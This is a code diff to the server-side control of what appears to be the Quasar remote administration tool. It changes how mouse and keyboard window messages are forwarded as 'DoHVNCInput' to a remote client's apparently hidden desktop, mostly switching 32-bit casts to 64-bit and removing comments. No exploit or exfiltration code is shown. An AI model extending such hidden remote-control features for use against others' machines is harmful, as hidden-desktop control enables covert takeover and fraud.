@@ -279,66 +279,63 @@ namespace Quasar.Server.Controls
                 case 0x0209: // WM_MBUTTONDBLCLK
                 case 0x0200: // WM_MOUSEMOVE
                 case 0x020A: // WM_MOUSEWHEEL
-                    int x = (int)(m.LParam.ToInt32() & 0xFFFF);
-                    int y = (int)((m.LParam.ToInt32() >> 16) & 0xFFFF);
+                    short delta = (short)((m.WParam.ToInt64() >> 16) & 0xFFFF);
 
-                    // Get coordinates in original image space
+                    int x = (int)(m.LParam.ToInt64() & 0xFFFF);
+                    int y = (int)((m.LParam.ToInt64() >> 16) & 0xFFFF);
+
                     Point newpoint = TranslateCoordinates(new Point(x, y), this);
 
-                    // Create new LParam with translated coordinates
                     m.LParam = (IntPtr)((newpoint.Y << 16) | (newpoint.X & 0xFFFF));
 
                     uint msg = (uint)m.Msg;
                     IntPtr wParam = m.WParam;
                     IntPtr lParam = m.LParam;
-                    int Imsg = (int)msg;
-                    int IwParam = (int)wParam;
-                    int IlParam = (int)lParam;
+                    long Imsg = (long)msg;
+                    long IwParam = wParam.ToInt64();
+                    long IlParam = lParam.ToInt64();
 
                     Task.Run(async () =>
                     {
-                        client.Send(new DoHVNCInput { msg = msg, wParam = IwParam, lParam = IlParam });
+                        client.Send(new DoHVNCInput { msg = msg, wParam = (int)IwParam, lParam = (int)IlParam });
                     }).Wait();
                     break;
 
-                case 0x0302: //WM_PASTE
+                case 0x0302:
                     break;
 
-                case 0x0100: //WM_KEYDOWN
-                case 0x0101: // WM_KEYUP
+                case 0x0100:
+                case 0x0101:
                     msg = (uint)m.Msg;
                     wParam = m.WParam;
                     lParam = m.LParam;
 
-                    // Check if the Shift or Caps Lock key is pressed
                     bool isShiftPressed = (GetKeyState((int)Keys.ShiftKey) & 0x8000) != 0;
                     bool isCapsLockOn = Control.IsKeyLocked(Keys.CapsLock);
                     if (isShiftPressed || isCapsLockOn)
                     {
-                        // Modify the wParam to include the SHIFT or CAPSLOCK flag
                         const int VK_SHIFT = 0x10;
                         const int VK_CAPITAL = 0x14;
 
                         if (wParam.ToInt32() == VK_SHIFT || wParam.ToInt32() == VK_CAPITAL)
                         {
-                            // Skip processing SHIFT or CAPSLOCK key release
                             break;
                         }
 
                         if (isShiftPressed)
                         {
                             msg = 0x0102;
-                            uint scanCode = (uint)((lParam.ToInt32() >> 16) & 0xFF);
+                            uint scanCode = (uint)((lParam.ToInt64() >> 16) & 0xFF);
                             byte[] keyboardState = new byte[256];
-                            ToAscii((uint)wParam.ToInt32(), scanCode, keyboardState, out uint charCode, 0);
+                            ToAscii((uint)wParam.ToInt64(), scanCode, keyboardState, out uint charCode, 0);
                             wParam = (IntPtr)Convert.ToInt32(GetModifiedKey((char)charCode));
                         }
 
                         if (isCapsLockOn)
                         {
-                            uint scanCode = (uint)((lParam.ToInt32() >> 16) & 0xFF);
+                            uint scanCode = (uint)((lParam.ToInt64() >> 16) & 0xFF);
                             byte[] keyboardState = new byte[256];
-                            ToAscii((uint)wParam.ToInt32(), scanCode, keyboardState, out uint charCode, 0);
+                            ToAscii((uint)wParam.ToInt64(), scanCode, keyboardState, out uint charCode, 0);
                             if (IsAlphaNumeric((char)charCode))
                             {
                                 msg = 0x0102;
@@ -347,12 +344,12 @@ namespace Quasar.Server.Controls
                     }
                     try
                     {
-                        Imsg = (int)msg;
-                        IwParam = (int)wParam;
-                        IlParam = (int)lParam;
+                        Imsg = (long)msg;
+                        IwParam = wParam.ToInt64();
+                        IlParam = lParam.ToInt64();
                         Task.Run(async () =>
                         {
-                            client.Send(new DoHVNCInput { msg = msg, wParam = IwParam, lParam = IlParam });
+                            client.Send(new DoHVNCInput { msg = msg, wParam = (int)IwParam, lParam = (int)IlParam });
                         }).Wait();
                         break;
                     }
@@ -360,7 +357,6 @@ namespace Quasar.Server.Controls
                     {
                         break;
                     }
-
             }
             base.WndProc(ref m);
         }
